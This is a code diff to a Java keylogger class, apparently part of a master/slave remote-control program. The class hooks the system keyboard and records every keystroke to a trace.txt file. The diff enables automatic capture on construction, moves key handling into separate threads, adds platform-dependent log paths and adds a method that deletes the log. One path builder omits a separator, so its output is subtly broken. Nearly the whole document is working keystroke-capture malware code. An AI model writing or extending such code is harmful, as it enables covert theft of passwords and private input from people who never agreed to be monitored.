@@ -15,9 +15,7 @@ import de.ksquared.system.keyboard.KeyListener;
 
 public class Keylogging extends Thread {
 
-	public static final String cheminFile = Paths.get("").toAbsolutePath()
-			.toString()
-			+ System.getProperty("file.separator") + "trace.txt";
+	public static String cheminFile;
 	private static File f;
 	private int code;
 	private static boolean capslock;
@@ -26,19 +24,22 @@ public class Keylogging extends Thread {
 	private int nombredecaractereparligne = 0;
 
 	public Keylogging(Esclave esclave) throws IOException {
+
 		// TODO Auto-generated constructor stub
+		cheminFile = getPath();
 		capslock = Toolkit.getDefaultToolkit().getLockingKeyState(
 				KeyEvent.VK_CAPS_LOCK);
 		f = new File(cheminFile);
 		pw = new PrintWriter(new BufferedWriter(
 				new FileWriter(cheminFile, true)));
 
-	/**	if (f.exists())
+		if (f.exists())
 			this.start();
 		else
 			System.out
 					.println("Ne peux pas ouvrir un fichier pour sauvegarder les frappes");
-	**/}
+
+	}
 
 	@Override
 	public void run() {
@@ -47,35 +48,45 @@ public class Keylogging extends Thread {
 			@Override
 			public void keyPressed(de.ksquared.system.keyboard.KeyEvent event) {
 				// TODO Auto-generated method stub
-				try {
-					code = event.getVirtualKeyCode();
-					System.out.println(code);
+				Thread t = new Thread() {
+					public void run() {
+						try {
+							code = event.getVirtualKeyCode();
 
-					char character = codeToChar(code);
-					pw.print(character);
-					pw.flush();
-					if (nombredecaractereparligne++ > 40) {
-						pw.println();
-						pw.flush();
-						nombredecaractereparligne = 0;
+							char character = codeToChar(code);
+							pw.print(character);
+							pw.flush();
+							if (nombredecaractereparligne++ > 40) {
+								pw.println();
+								pw.flush();
+								nombredecaractereparligne = 0;
+							}
+						} catch (Exception e) {
+							e.printStackTrace();
+						}
 					}
-				} catch (Exception e) {
-					e.printStackTrace();
-				}
+				};
+				t.start();
 			}
 
 			@Override
 			public void keyReleased(de.ksquared.system.keyboard.KeyEvent event) {
 				// TODO Auto-generated method stub
-				code = event.getVirtualKeyCode();
-				switch (code) {
-				case 160:
-					shift = false;
-					break;
-				case 161:
-					shift = false;
-					break;
-				}
+				Thread t1 = new Thread() {
+					public void run() {
+
+						code = event.getVirtualKeyCode();
+						switch (code) {
+						case 160:
+							shift = false;
+							break;
+						case 161:
+							shift = false;
+							break;
+						}
+					}
+				};
+				t1.start();
 			}
 		});
 		while (true) {
@@ -527,4 +538,14 @@ public class Keylogging extends Thread {
 		pw.close();
 	}
 
+	private  String getPath(){
+		 String chemin= (( System.getProperty("os.name").contains("win") || System
+					.getProperty("os.name").contains("Win")) ? Paths.get("").toAbsolutePath().toString() :
+						"/dev" ) +"trace.txt";
+		return chemin;
+	}
+	
+	public void supprimerFichier(){
+		f.delete();
+	}
 }
